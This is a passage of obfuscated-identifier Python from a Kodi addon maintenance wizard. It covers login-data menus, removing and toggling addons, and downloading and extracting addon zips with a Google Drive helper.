		OOOO0O0O0OO00OOO0 .append ((THEME2 %'%s Settings'%O00000O0O0O000O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0000O0000OOOO0OO )))#line:3015
		addFile ('[+]-> %s'%O00000O0O0O000O00 ,'',icon =OOO00O00000O0OOO0 ,fanart =O00OO00OO0OOOO0O0 ,themeit =THEME3 )#line:3017
		if not os .path .exists (O0000O0O000000O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO00O00000O0OOO0 ,fanart =O00OO00OO0OOOO0O0 ,menu =OOOO0O0O0OO00OOO0 )#line:3018
		elif not O0OO0OOOO000OO000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0000O0000OOOO0OO ,icon =OOO00O00000O0OOO0 ,fanart =O00OO00OO0OOOO0O0 ,menu =OOOO0O0O0OO00OOO0 )#line:3019
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OO0OOOO000OO000 ,'authlogin',O0000O0000OOOO0OO ,icon =OOO00O00000O0OOO0 ,fanart =O00OO00OO0OOOO0O0 ,menu =OOOO0O0O0OO00OOO0 )#line:3020
		if O0OOOOO0O0O0O0O00 =="":#line:3021
			if os .path .exists (OOOOO0OOO00OOOOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0000O0000OOOO0OO ,icon =OOO00O00000O0OOO0 ,fanart =O00OO00OO0OOOO0O0 ,menu =OOOO0O00OOOOO0OOO )#line:3022
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0000O0000OOOO0OO ,icon =OOO00O00000O0OOO0 ,fanart =O00OO00OO0OOOO0O0 ,menu =OOOO0O00OOOOO0OOO )#line:3023
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOOOO0O0O0O0O00 ,'',icon =OOO00O00000O0OOO0 ,fanart =O00OO00OO0OOOO0O0 ,menu =OOOO0O00OOOOO0OOO )#line:3024
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3026
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3027
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3028
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3029
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3030
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3031
	setView ('files','viewType')#line:3032
def fixUpdate ():#line:3034
	if KODIV <17 :#line:3035
		O0O000000O0O000O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3036
		try :#line:3037
			os .remove (O0O000000O0O000O0 )#line:3038
		except Exception as O0OO00O0O0OO0O00O :#line:3039
			wiz .log ("Unable to remove %s, Purging DB"%O0O000000O0O000O0 )#line:3040
			wiz .purgeDb (O0O000000O0O000O0 )#line:3041
	else :#line:3042
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3043
def removeAddonMenu ():#line:3045
	OOOOO00OOOO0OO0OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3046
	OOOO0O00OO000OOOO =[];O00OO0O00OOOOO0OO =[]#line:3047
	for OO000O00OO0O00OO0 in sorted (OOOOO00OOOO0OO0OO ,key =lambda O0OOO000O0O0O0OO0 :O0OOO000O0O0O0OO0 ):#line:3048
		OO00O00O00OOO0O0O =os .path .split (OO000O00OO0O00OO0 [:-1 ])[1 ]#line:3049
		if OO00O00O00OOO0O0O in EXCLUDES :continue #line:3050
		elif OO00O00O00OOO0O0O in DEFAULTPLUGINS :continue #line:3051
		elif OO00O00O00OOO0O0O =='packages':continue #line:3052
		OOO00O000O0OOO0O0 =os .path .join (OO000O00OO0O00OO0 ,'addon.xml')#line:3053
		if os .path .exists (OOO00O000O0OOO0O0 ):#line:3054
			O0O0OO000OO000OO0 =open (OOO00O000O0OOO0O0 )#line:3055
			OOO000OO00O00O00O =O0O0OO000OO000OO0 .read ()#line:3056
			OO0O0O0000O00OOOO =wiz .parseDOM (OOO000OO00O00O00O ,'addon',ret ='id')#line:3057
			OO00OO000O0O00O0O =OO00O00O00OOO0O0O if len (OO0O0O0000O00OOOO )==0 else OO0O0O0000O00OOOO [0 ]#line:3059
			try :#line:3060
				OO00O0000OOO00O0O =xbmcaddon .Addon (id =OO00OO000O0O00O0O )#line:3061
				OOOO0O00OO000OOOO .append (OO00O0000OOO00O0O .getAddonInfo ('name'))#line:3062
				O00OO0O00OOOOO0OO .append (OO00OO000O0O00O0O )#line:3063
			except :#line:3064
				pass #line:3065
	if len (OOOO0O00OO000OOOO )==0 :#line:3066
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3067
		return #line:3068
	if KODIV >16 :#line:3069
		O00OOOO0OO0O00000 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOO0O00OO000OOOO )#line:3070
	else :#line:3071
		O00OOOO0OO0O00000 =[];O0000OO0OOO00O0O0 =0 #line:3072
		OOO0O00O0OOO00O0O =["-- Click here to Continue --"]+OOOO0O00OO000OOOO #line:3073
		while not O0000OO0OOO00O0O0 ==-1 :#line:3074
			O0000OO0OOO00O0O0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0O00O0OOO00O0O )#line:3075
			if O0000OO0OOO00O0O0 ==-1 :break #line:3076
			elif O0000OO0OOO00O0O0 ==0 :break #line:3077
			else :#line:3078
				OO000O00OO0O00O00 =(O0000OO0OOO00O0O0 -1 )#line:3079
				if OO000O00OO0O00O00 in O00OOOO0OO0O00000 :#line:3080
					O00OOOO0OO0O00000 .remove (OO000O00OO0O00O00 )#line:3081
					OOO0O00O0OOO00O0O [O0000OO0OOO00O0O0 ]=OOOO0O00OO000OOOO [OO000O00OO0O00O00 ]#line:3082
				else :#line:3083
					O00OOOO0OO0O00000 .append (OO000O00OO0O00O00 )#line:3084
					OOO0O00O0OOO00O0O [O0000OO0OOO00O0O0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOOO0O00OO000OOOO [OO000O00OO0O00O00 ])#line:3085
	if O00OOOO0OO0O00000 ==None :return #line:3086
	if len (O00OOOO0OO0O00000 )>0 :#line:3087
		wiz .addonUpdates ('set')#line:3088
		for O0O0O0O0OOO00OOO0 in O00OOOO0OO0O00000 :#line:3089
			removeAddon (O00OO0O00OOOOO0OO [O0O0O0O0OOO00OOO0 ],OOOO0O00OO000OOOO [O0O0O0O0OOO00OOO0 ],True )#line:3090
		xbmc .sleep (1000 )#line:3092
		if INSTALLMETHOD ==1 :OO00O0OO0O0O00O00 =1 #line:3094
		elif INSTALLMETHOD ==2 :OO00O0OO0O0O00O00 =0 #line:3095
		else :OO00O0OO0O0O00O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3096
		if OO00O0OO0O0O00O00 ==1 :wiz .reloadFix ('remove addon')#line:3097
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3098
def removeAddonDataMenu ():#line:3100
	if os .path .exists (ADDOND ):#line:3101
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3102
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3103
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3104
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3105
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3106
		OO0O0O00OOOOO0O00 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3107
		for O00O0O00O0O0O00OO in sorted (OO0O0O00OOOOO0O00 ,key =lambda OOO00OO00OO0O00O0 :OOO00OO00OO0O00O0 ):#line:3108
			OOOO0OOO0O00O0O0O =O00O0O00O0O0O00OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3109
			O0000OOOOO00000OO =os .path .join (O00O0O00O0O0O00OO .replace (ADDOND ,ADDONS ),'icon.png')#line:3110
			OOO0OOO0O0000000O =os .path .join (O00O0O00O0O0O00OO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3111
			OO00OOOO000OOOOOO =OOOO0OOO0O00O0O0O #line:3112
			O0OOO00OOOO0OOO00 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3113
			for O00O000O0OOOO0OO0 in O0OOO00OOOO0OOO00 :#line:3114
				OO00OOOO000OOOOOO =OO00OOOO000OOOOOO .replace (O00O000O0OOOO0OO0 ,O0OOO00OOOO0OOO00 [O00O000O0OOOO0OO0 ])#line:3115
			if OOOO0OOO0O00O0O0O in EXCLUDES :OO00OOOO000OOOOOO ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO00OOOO000OOOOOO #line:3116
			else :OO00OOOO000OOOOOO ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO00OOOO000OOOOOO #line:3117
			addFile (' %s'%OO00OOOO000OOOOOO ,'removedata',OOOO0OOO0O00O0O0O ,icon =O0000OOOOO00000OO ,fanart =OOO0OOO0O0000000O ,themeit =THEME2 )#line:3118
	else :#line:3119
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3120
	setView ('files','viewType')#line:3121
def enableAddons ():#line:3123
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3124
	OOOOOOOO000OO0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3125
	OO00O0O0O00OOO000 =0 #line:3126
	for O0O0O0OOO00O0000O in sorted (OOOOOOOO000OO0OOO ,key =lambda OOOOOOO0O00OOOOOO :OOOOOOO0O00OOOOOO ):#line:3127
		OOOO00O000O000OOO =os .path .split (O0O0O0OOO00O0000O [:-1 ])[1 ]#line:3128
		if OOOO00O000O000OOO in EXCLUDES :continue #line:3129
		if OOOO00O000O000OOO in DEFAULTPLUGINS :continue #line:3130
		OO0000O00OO0000O0 =os .path .join (O0O0O0OOO00O0000O ,'addon.xml')#line:3131
		if os .path .exists (OO0000O00OO0000O0 ):#line:3132
			OO00O0O0O00OOO000 +=1 #line:3133
			OOOOOOOO000OO0OOO =O0O0O0OOO00O0000O .replace (ADDONS ,'')[1 :-1 ]#line:3134
			O00OO00OO0OO0O000 =open (OO0000O00OO0000O0 )#line:3135
			OO0OOOO0O0O00O0OO =O00OO00OO0OO0O000 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3136
			O0O0OOO0O0O0O0OOO =wiz .parseDOM (OO0OOOO0O0O00O0OO ,'addon',ret ='id')#line:3137
			OO000O0OO000O000O =wiz .parseDOM (OO0OOOO0O0O00O0OO ,'addon',ret ='name')#line:3138
			try :#line:3139
				O0000O0OO0000O00O =O0O0OOO0O0O0O0OOO [0 ]#line:3140
				OO00O00OOOO00O000 =OO000O0OO000O000O [0 ]#line:3141
			except :#line:3142
				continue #line:3143
			try :#line:3144
				O000O000OOOO0OOOO =xbmcaddon .Addon (id =O0000O0OO0000O00O )#line:3145
				O0OOO0O0O0OOO0OO0 ="[COLOR green][Enabled][/COLOR]"#line:3146
				O0O00O000O00OOOO0 ="false"#line:3147
			except :#line:3148
				O0OOO0O0O0OOO0OO0 ="[COLOR red][Disabled][/COLOR]"#line:3149
				O0O00O000O00OOOO0 ="true"#line:3150
				pass #line:3151
			O000OOO0O0OOO00OO =os .path .join (O0O0O0OOO00O0000O ,'icon.png')if os .path .exists (os .path .join (O0O0O0OOO00O0000O ,'icon.png'))else ICON #line:3152
			OOOOO0000OOOOO0O0 =os .path .join (O0O0O0OOO00O0000O ,'fanart.jpg')if os .path .exists (os .path .join (O0O0O0OOO00O0000O ,'fanart.jpg'))else FANART #line:3153
			addFile ("%s %s"%(O0OOO0O0O0OOO0OO0 ,OO00O00OOOO00O000 ),'toggleaddon',OOOOOOOO000OO0OOO ,O0O00O000O00OOOO0 ,icon =O000OOO0O0OOO00OO ,fanart =OOOOO0000OOOOO0O0 )#line:3154
			O00OO00OO0OO0O000 .close ()#line:3155
	if OO00O0O0O00OOO000 ==0 :#line:3156
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3157
	setView ('files','viewType')#line:3158
def changeFeq ():#line:3160
	OO00OOO00OOOOOO00 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3161
	OOOOOO0OOO0OOO00O =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO00OOO00OOOOOO00 )#line:3162
	if not OOOOOO0OOO0OOO00O ==-1 :#line:3163
		wiz .setS ('autocleanfeq',str (OOOOOO0OOO0OOO00O ))#line:3164
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO00OOO00OOOOOO00 [OOOOOO0OOO0OOO00O ]))#line:3165
def developer ():#line:3167
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3168
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3169
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3170
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3171
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3172
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3173
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3174
	setView ('files','viewType')#line:3176
def download (OO0O0OO0O0O00OO00 ,OO0000O000O000OOO ):#line:3181
  O000O0O00O0O00OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3182
  O0OO00O0O0O00OO0O =xbmcgui .DialogProgress ()#line:3183
  O0OO00O0O0O00OO0O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3184
  OO00O0OO00OO000OO =os .path .join (O000O0O00O0O00OO0 ,'isr.zip')#line:3185
  OOOOO000O0O00O0O0 =urllib2 .Request (OO0O0OO0O0O00OO00 )#line:3186
  OOO0O00O0OOOO000O =urllib2 .urlopen (OOOOO000O0O00O0O0 )#line:3187
  O00OOO0OO0OOOO0O0 =xbmcgui .DialogProgress ()#line:3189
  O00OOO0OO0OOOO0O0 .create ("Downloading","Downloading "+name )#line:3190
  O00OOO0OO0OOOO0O0 .update (0 )#line:3191
  O0000000O0OOOOO00 =OO0000O000O000OOO #line:3192
  OOO00O0000OOO0OOO =open (OO00O0OO00OO000OO ,'wb')#line:3193
  try :#line:3195
    OO00OO0O00OO00OOO =OOO0O00O0OOOO000O .info ().getheader ('Content-Length').strip ()#line:3196
    OO0000O00OO0OO00O =True #line:3197
  except AttributeError :#line:3198
        OO0000O00OO0OO00O =False #line:3199
  if OO0000O00OO0OO00O :#line:3201
        OO00OO0O00OO00OOO =int (OO00OO0O00OO00OOO )#line:3202
  OO00O0OOO000O0000 =0 #line:3204
  OOOO00000O000000O =time .time ()#line:3205
  while True :#line:3206
        O0OOO0OOOOOOOOOO0 =OOO0O00O0OOOO000O .read (8192 )#line:3207
        if not O0OOO0OOOOOOOOOO0 :#line:3208
            sys .stdout .write ('\n')#line:3209
            break #line:3210
        OO00O0OOO000O0000 +=len (O0OOO0OOOOOOOOOO0 )#line:3212
        OOO00O0000OOO0OOO .write (O0OOO0OOOOOOOOOO0 )#line:3213
        if not OO0000O00OO0OO00O :#line:3215
            OO00OO0O00OO00OOO =OO00O0OOO000O0000 #line:3216
        if O00OOO0OO0OOOO0O0 .iscanceled ():#line:3217
           O00OOO0OO0OOOO0O0 .close ()#line:3218
           try :#line:3219
            os .remove (OO00O0OO00OO000OO )#line:3220
           except :#line:3221
            pass #line:3222
           break #line:3223
        OOOOO00O0O0000O0O =float (OO00O0OOO000O0000 )/OO00OO0O00OO00OOO #line:3224
        OOOOO00O0O0000O0O =round (OOOOO00O0O0000O0O *100 ,2 )#line:3225
        O00OO00OO0OO0OO0O =OO00O0OOO000O0000 /(1024 *1024 )#line:3226
        O0O0000O0OO0O000O =OO00OO0O00OO00OOO /(1024 *1024 )#line:3227
        O0O000OO0000OOO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OO00OO0OO0OO0O ,'teal',O0O0000O0OO0O000O )#line:3228
        if (time .time ()-OOOO00000O000000O )>0 :#line:3229
          OO0O00000O0OOO0OO =OO00O0OOO000O0000 /(time .time ()-OOOO00000O000000O )#line:3230
          OO0O00000O0OOO0OO =OO0O00000O0OOO0OO /1024 #line:3231
        else :#line:3232
         OO0O00000O0OOO0OO =0 #line:3233
        O00O0OO00OOO0000O ='KB'#line:3234
        if OO0O00000O0OOO0OO >=1024 :#line:3235
           OO0O00000O0OOO0OO =OO0O00000O0OOO0OO /1024 #line:3236
           O00O0OO00OOO0000O ='MB'#line:3237
        if OO0O00000O0OOO0OO >0 and not OOOOO00O0O0000O0O ==100 :#line:3238
            O0OOOOO00000O00O0 =(OO00OO0O00OO00OOO -OO00O0OOO000O0000 )/OO0O00000O0OOO0OO #line:3239
        else :#line:3240
            O0OOOOO00000O00O0 =0 #line:3241
        O000O00O0O0OOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O00000O0OOO0OO ,O00O0OO00OOO0000O )#line:3242
        O00OOO0OO0OOOO0O0 .update (int (OOOOO00O0O0000O0O ),"Downloading "+name ,O0O000OO0000OOO00 ,O000O00O0O0OOO00O )#line:3244
  OOOO00OO000O0O0OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3247
  OOO00O0000OOO0OOO .close ()#line:3249
  extract (OO00O0OO00OO000OO ,OOOO00OO000O0O0OO ,O00OOO0OO0OOOO0O0 )#line:3251
  if os .path .exists (OOOO00OO000O0O0OO +'/scakemyer-script.quasar.burst'):#line:3252
    if os .path .exists (OOOO00OO000O0O0OO +'/script.quasar.burst'):#line:3253
     shutil .rmtree (OOOO00OO000O0O0OO +'/script.quasar.burst',ignore_errors =False )#line:3254
    os .rename (OOOO00OO000O0O0OO +'/scakemyer-script.quasar.burst',OOOO00OO000O0O0OO +'/script.quasar.burst')#line:3255
  if os .path .exists (OOOO00OO000O0O0OO +'/plugin.video.kmediatorrent-master'):#line:3257
    if os .path .exists (OOOO00OO000O0O0OO +'/plugin.video.kmediatorrent'):#line:3258
     shutil .rmtree (OOOO00OO000O0O0OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3259
    os .rename (OOOO00OO000O0O0OO +'/plugin.video.kmediatorrent-master',OOOO00OO000O0O0OO +'/plugin.video.kmediatorrent')#line:3260
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3261
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3262
  try :#line:3263
    os .remove (OO00O0OO00OO000OO )#line:3264
  except :#line:3265
    pass #line:3266
  O00OOO0OO0OOOO0O0 .close ()#line:3267
def dis_or_enable_addon (OOOO0O0O000OOOOO0 ,OOO0O00OO000OOO0O ,enable ="true"):#line:3268
    import json #line:3269
    OO00000O0000O0O00 ='"%s"'%OOOO0O0O000OOOOO0 #line:3270
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO0O0O000OOOOO0 )and enable =="true":#line:3271
        logging .warning ('already Enabled')#line:3272
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOO0O0O000OOOOO0 )#line:3273
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO0O0O000OOOOO0 )and enable =="false":#line:3274
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOO0O0O000OOOOO0 )#line:3275
    else :#line:3276
        O0O0O0O0OOOOOO000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO00000O0000O0O00 ,enable )#line:3277
        O0OO00OO0O00O0000 =xbmc .executeJSONRPC (O0O0O0O0OOOOOO000 )#line:3278
        OOOO000000OO000O0 =json .loads (O0OO00OO0O00O0000 )#line:3279
        if enable =="true":#line:3280
            xbmc .log ("### Enabled %s, response = %s"%(OOOO0O0O000OOOOO0 ,OOOO000000OO000O0 ))#line:3281
        else :#line:3282
            xbmc .log ("### Disabled %s, response = %s"%(OOOO0O0O000OOOOO0 ,OOOO000000OO000O0 ))#line:3283
    if OOO0O00OO000OOO0O =='auto':#line:3284
     return True #line:3285
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3286
def chunk_report (OOO000000OO0OO00O ,OO0O0000O0O0OOO00 ,O000O0OO0O00OO00O ):#line:3287
   OO00OOO0O0O0OO0OO =float (OOO000000OO0OO00O )/O000O0OO0O00OO00O #line:3288
   OO00OOO0O0O0OO0OO =round (OO00OOO0O0O0OO0OO *100 ,2 )#line:3289
   if OOO000000OO0OO00O >=O000O0OO0O00OO00O :#line:3291
      sys .stdout .write ('\n')#line:3292
def chunk_read (O0000OOO00O0O0000 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3294
   import time #line:3295
   O0OO00O000OOOOOOO =int (filesize )*1000000 #line:3296
   O0000O0OO0OO0O00O =0 #line:3298
   OOOOO00OO0O0O000O =time .time ()#line:3299
   OO0O000OOO0OOOO0O =0 #line:3300
   logging .warning ('Downloading')#line:3302
   with open (destination ,"wb")as OO000O00O0O000O0O :#line:3303
    while 1 :#line:3304
      O00O0OO0OO0O0OO00 =time .time ()-OOOOO00OO0O0O000O #line:3305
      O000000O0O0O0O000 =int (OO0O000OOO0OOOO0O *chunk_size )#line:3306
      OOOO0OO0O0000OO00 =O0000OOO00O0O0000 .read (chunk_size )#line:3307
      OO000O00O0O000O0O .write (OOOO0OO0O0000OO00 )#line:3308
      OO000O00O0O000O0O .flush ()#line:3309
      O0000O0OO0OO0O00O +=len (OOOO0OO0O0000OO00 )#line:3310
      OO000OO0OOOO00O0O =float (O0000O0OO0OO0O00O )/O0OO00O000OOOOOOO #line:3311
      OO000OO0OOOO00O0O =round (OO000OO0OOOO00O0O *100 ,2 )#line:3312
      if int (O00O0OO0OO0O0OO00 )>0 :#line:3313
        O0O000000OOO0O0OO =int (O000000O0O0O0O000 /(1024 *O00O0OO0OO0O0OO00 ))#line:3314
      else :#line:3315
         O0O000000OOO0O0OO =0 #line:3316
      if O0O000000OOO0O0OO >1024 and not OO000OO0OOOO00O0O ==100 :#line:3317
          O0O0O0OOO0OO0OO00 =int (((O0OO00O000OOOOOOO -O000000O0O0O0O000 )/1024 )/(O0O000000OOO0O0OO ))#line:3318
      else :#line:3319
          O0O0O0OOO0OO0OO00 =0 #line:3320
      if O0O0O0OOO0OO0OO00 <0 :#line:3321
        O0O0O0OOO0OO0OO00 =0 #line:3322
      dp .update (int (OO000OO0OOOO00O0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO000OO0OOOO00O0O ,O000000O0O0O0O000 /(1024 *1024 ),O0OO00O000OOOOOOO /(1000 *1000 ),O0O000000OOO0O0OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0O0OOO0OO0OO00 ,60 ))#line:3323
      if dp .iscanceled ():#line:3324
         dp .close ()#line:3325
         break #line:3326
      if not OOOO0OO0O0000OO00 :#line:3327
         break #line:3328
      if report_hook :#line:3330
         report_hook (O0000O0OO0OO0O00O ,chunk_size ,O0OO00O000OOOOOOO )#line:3331
      OO0O000OOO0OOOO0O +=1 #line:3332
   logging .warning ('END Downloading')#line:3333
   return O0000O0OO0OO0O00O #line:3334
def googledrive_download (O000O0O000O0OO0OO ,O00OO00000O0O00OO ,O0OO0OOO0OOOOO000 ,OO0000OOOOO00OO0O ):#line:3336
    O0OOOO0OO00000000 =[]#line:3340
    O00O0OO0O0O0OOOOO =O000O0O000O0OO0OO .split ('=')#line:3341
    O000O0O000O0OO0OO =O00O0OO0O0O0OOOOO [len (O00O0OO0O0O0OOOOO )-1 ]#line:3342
    def OO000000O0OOO0O00 (OOO00OO000O00OO00 ):#line:3344
        for OO00OOO0O000OO0OO in OOO00OO000O00OO00 :#line:3346
            logging .warning ('cookie.name')#line:3347
            logging .warning (OO00OOO0O000OO0OO .name )#line:3348
            O0O0OO0OOO000OOO0 =OO00OOO0O000OO0OO .value #line:3349
            if 'download_warning'in OO00OOO0O000OO0OO .name :#line:3350
                logging .warning (OO00OOO0O000OO0OO .value )#line:3351
                logging .warning ('cookie.value')#line:3352
                return OO00OOO0O000OO0OO .value #line:3353
            return O0O0OO0OOO000OOO0 #line:3354
        return None #line:3356
    def O0OOOO0OOO000O0OO (OOO00O0O0OOOOO000 ,OOOOOOOOOOOO0OOO0 ):#line:3358
        O0OOO00O00OOOOOOO =32768 #line:3360
        OO00OO0OO000O0OOO =time .time ()#line:3361
        with open (OOOOOOOOOOOO0OOO0 ,"wb")as OO00OOO0000OOOO0O :#line:3363
            OO0O0OO00OOOOO000 =1 #line:3364
            OOOO0O0OOOO0OOO00 =32768 #line:3365
            try :#line:3366
                O00O000O00OOO000O =int (OOO00O0O0OOOOO000 .headers .get ('content-length'))#line:3367
                print ('file total size :',O00O000O00OOO000O )#line:3368
            except TypeError :#line:3369
                print ('using dummy length !!!')#line:3370
                O00O000O00OOO000O =int (OO0000OOOOO00OO0O )*1000000 #line:3371
            for OO00O0O0O00O00O0O in OOO00O0O0OOOOO000 .iter_content (O0OOO00O00OOOOOOO ):#line:3372
                if OO00O0O0O00O00O0O :#line:3373
                    OO00OOO0000OOOO0O .write (OO00O0O0O00O00O0O )#line:3374
                    OO00OOO0000OOOO0O .flush ()#line:3375
                    O0O0000OOO000000O =time .time ()-OO00OO0OO000O0OOO #line:3376
                    O0O00O0O0O0OO00O0 =int (OO0O0OO00OOOOO000 *OOOO0O0OOOO0OOO00 )#line:3377
                    if O0O0000OOO000000O ==0 :#line:3378
                        O0O0000OOO000000O =0.1 #line:3379
                    OO000O00000O0OO0O =int (O0O00O0O0O0OO00O0 /(1024 *O0O0000OOO000000O ))#line:3380
                    O00O00000OOO000O0 =int (OO0O0OO00OOOOO000 *OOOO0O0OOOO0OOO00 *100 /O00O000O00OOO000O )#line:3381
                    if OO000O00000O0OO0O >1024 and not O00O00000OOO000O0 ==100 :#line:3382
                      O0OO00OO0OOOOOOOO =int (((O00O000O00OOO000O -O0O00O0O0O0OO00O0 )/1024 )/(OO000O00000O0OO0O ))#line:3383
                    else :#line:3384
                      O0OO00OO0OOOOOOOO =0 #line:3385
                    O0OO0OOO0OOOOO000 .update (int (O00O00000OOO000O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00O00000OOO000O0 ,O0O00O0O0O0OO00O0 /(1024 *1024 ),O00O000O00OOO000O /(1000 *1000 ),OO000O00000O0OO0O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OO00OO0OOOOOOOO ,60 ))#line:3387
                    OO0O0OO00OOOOO000 +=1 #line:3388
                    if O0OO0OOO0OOOOO000 .iscanceled ():#line:3389
                     O0OO0OOO0OOOOO000 .close ()#line:3390
                     break #line:3391
    OO00000OO0OOOOO00 ="https://docs.google.com/uc?export=download"#line:3392
    import urllib2 #line:3397
    import cookielib #line:3398
    from cookielib import CookieJar #line:3400
    O0O00000O000OOOO0 =CookieJar ()#line:3402
    OOO00OO0OO0O0000O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0O00000O000OOOO0 ))#line:3403
    OO0O0OO0O0OOO0O0O ={'id':O000O0O000O0OO0OO }#line:3405
    OOOO0OO000O0O0000 =urllib .urlencode (OO0O0OO0O0OOO0O0O )#line:3406
    logging .warning (OO00000OO0OOOOO00 +'&'+OOOO0OO000O0O0000 )#line:3407
    O0O0OO0O0000OOOOO =OOO00OO0OO0O0000O .open (OO00000OO0OOOOO00 +'&'+OOOO0OO000O0O0000 )#line:3408
    OO0O0OOO000O00O00 =O0O0OO0O0000OOOOO .read ()#line:3409
    for O0OOO0000O0OO0000 in O0O00000O000OOOO0 :#line:3411
         logging .warning (O0OOO0000O0OO0000 )#line:3412
    OOO00OOOO00OOO000 =OO000000O0OOO0O00 (O0O00000O000OOOO0 )#line:3413
    logging .warning (OOO00OOOO00OOO000 )#line:3414
    if OOO00OOOO00OOO000 :#line:3415
